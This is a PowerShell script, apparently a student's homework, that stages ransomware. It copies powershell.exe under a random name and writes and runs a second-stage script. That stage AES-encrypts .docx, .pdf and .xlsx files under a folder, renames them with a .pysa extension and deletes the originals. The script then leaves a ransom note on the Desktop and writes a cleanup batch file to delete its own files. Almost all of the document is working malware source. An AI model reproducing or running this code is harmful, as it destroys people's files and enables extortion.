# Script: ransomware_step1.ps1
# Author: Dylan 'Chromosom3' Navarro
# Description: Stages ransomeware payload on a target system.

# Copy PowerShell.exe to the home directory
$random_num = Get-Random -Minimum 1000 -Maximum 9876
$ran_powershell = "~\EnNoB-$random_num.exe"
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $ran_powershell
# Check if the file exists 
if ((Test-Path -Path $ran_powershell) -eq $false) {
    exit
}
$stage2 = @'
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".pysa"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

$dir_to_scan = "E:\Repositories\SYS320-Automation-Scripting\Week13\homework\Documents"

# Not going to save this to a CSV, this keeps it simpler.
$filelist = Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx -Path $dir_to_scan

# CSV code that isn't being used but is required for the assignemt's first task
#Get-ChildItem -Recurse -Include *.docx, *.pdf, *.txt -Path .\Documents | Export-Csv -Path files.csv
#$filelist = Import-Csv -Path .\files.csv -Header FullName

# Loop through the results
foreach ($file in $filelist) {
    # Encrypt Files
    Invoke-AESEncryption -Mode Encrypt -Key 'p@ssw0rd' -Path $file.FullName
    Remove-Item -Path $file.FullName
}

'@

$stage2_name = "stage2.ps1"
$stage2 | Out-File -FilePath $stage2_name

& $ran_powershell .\stage2.ps1

# Ransom message
$message = "If you want your files restored, please contact me at [EMAIL]. I look forward to doing business with you."
# Write the message to a file 
$message | Out-File -FilePath "~\Desktop\Readme.READ"

$stage1_name = $MyInvocation.MyCommand.Path

$cleanupfile = @"
del $stage1_name
del $stage2_name
"@

$cleanupfile | Out-File -FilePath "update.bat" -Encoding oem